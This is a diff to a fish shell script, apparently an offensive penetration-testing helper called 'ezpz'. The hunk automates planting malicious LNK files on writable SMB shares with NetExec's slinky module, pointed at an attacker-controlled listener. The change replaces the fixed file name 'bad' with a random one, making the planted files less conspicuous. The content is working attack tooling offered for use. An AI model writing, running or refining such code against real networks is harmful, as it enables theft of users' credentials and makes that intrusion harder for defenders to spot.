@@ -266,11 +266,13 @@ ezpz enumshares -t 10.10.10.10  # null session
                 else
                     ezpz_header "Creating malicious LNK files on WRITE shares"
                     set -l slinky_shares (string join ',' $write_shares)
-                    ezpz_cmd "nxc smb $target $nxc_auth -M slinky -o NAME='bad' SERVER=$listener SHARES=$slinky_shares"
+                    set -l lnk_name (head -c 8 /dev/urandom | base64 | tr -dc 'a-z0-9' | cut -c1-4)
+                    test -n "$lnk_name"; or set lnk_name bad
+                    ezpz_cmd "nxc smb $target $nxc_auth -M slinky -o NAME='$lnk_name' SERVER=$listener SHARES=$slinky_shares"
 
-                    set -l slinky_lines (ezpz_spin nxc smb $target $nxc_auth -M slinky -o NAME='bad' SERVER=$listener SHARES=$slinky_shares \
+                    set -l slinky_lines (ezpz_spin nxc smb $target $nxc_auth -M slinky -o NAME="$lnk_name" SERVER=$listener SHARES=$slinky_shares \
                         | grep -aoE 'Created LNK file on the .* share|Error.*' \
-                        | sed -E "s/Created LNK file on the (.*) share/Created 'bad.lnk' LNK file on the \\1 share/")
+                        | sed -E "s/Created LNK file on the (.*) share/Created '$lnk_name.lnk' LNK file on the \\1 share/")
                     if test -n "$slinky_lines"
                         for line in $slinky_lines
                             if string match -q 'Error*' -- $line
